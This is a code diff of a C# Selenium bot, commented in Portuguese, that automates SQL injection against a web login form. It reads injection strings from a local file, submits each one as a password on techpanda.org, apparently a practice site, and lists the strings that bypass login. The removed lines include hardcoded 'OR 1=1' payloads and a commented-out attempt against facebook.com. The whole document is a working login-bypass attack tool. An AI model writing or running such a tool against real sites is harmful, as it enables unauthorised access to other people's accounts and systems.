@@ -10,16 +10,36 @@ namespace BotSQLInjection
 {
     class Program
     {
+
         static void Main(string[] args)
         {
-            testLogin("http://www.techpanda.org", "email", "password", "input", "xxx@xxx.xxx", "xxx\') OR 1=1 -- ]");
-            //testLogin("http://www.facebook.com", "email", "pass", "loginbutton", "\' OR 1=1\'--", "bundinha");
+            //Lista de Strings de Injeção Sql, lidas a partir de um arquivo de texto.
+            string[] txt = readFromFile();
 
+            //Lista de Strings que possibilitaram o login.
+            List<String> threatStrings = new List<String>();
+
+            //Variavel controladora para saber se foi possível fazer o login ou não.
+            Boolean success;
+
+            //Percorre cada string lida no arquivo de texto
+            foreach (var line in txt)
+            {
+                success = testLogin("http://www.techpanda.org", "email", "password", "input", "xxx@xxx.xxx", line);
+                if (success)
+                    threatStrings.Add(line); //Se foi possível fazer login com essa string, adiciona na lista das ameaças.
+            }
+            Console.Clear();
+            Console.WriteLine($"Foi encontrado {threatStrings.Count()} senha(s) que permitiram acesso via Injeção de Sql:");
+            foreach (var succesString in threatStrings)
+                Console.WriteLine(succesString);
         }
-        public static void testLogin(String url, String txtEmail, String txtSenha, String txtBotao, String vEmail, String vSenha)
+        public static Boolean testLogin(String url, String txtEmail, String txtSenha, String txtBotao, String vEmail, String vSenha)
         {
+            //Criando o driver que representa o navegador.
             IWebDriver driver = new ChromeDriver();
 
+            //Navegando até a URL informada e inserindo os valores nos campos informados.
             driver.Navigate().GoToUrl(url);
 
             IWebElement email = driver.FindElement(By.Name(txtEmail));
@@ -29,6 +49,31 @@ namespace BotSQLInjection
             email.SendKeys(vEmail);
             senha.SendKeys(vSenha);
             botao.Click();
+
+            //Adicionando 1 segundo de espera para completar o login para o próximo teste.
+            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(1);
+
+            //Verificando se existe o botão após fazer o login
+            //É verificado pelo xPath pois não há id nem name, e o xPath é um método que recebe como parâmetro
+            //Uma String que apenas aquele elemento no DOM, possui.
+            //Se encontrar, irá retornar true, se não encontrar, vai lançar uma exception de elemento nao encontrado e retornará false.
+            try
+            {
+                IWebElement findBtnAfterLogin = driver.FindElement(By.XPath("/ html / body / div / div[3] / a / input"));
+                driver.Close();
+                return true;
+            }
+            catch (NoSuchElementException ex)
+            {
+                driver.Close();
+                return false;
+            }
+        }
+
+        public static string[] readFromFile()
+        {
+            string[] lines = System.IO.File.ReadAllLines(@"C:\Users\amauri\Desktop\sql.txt");
+            return lines;
         }
     }
 }
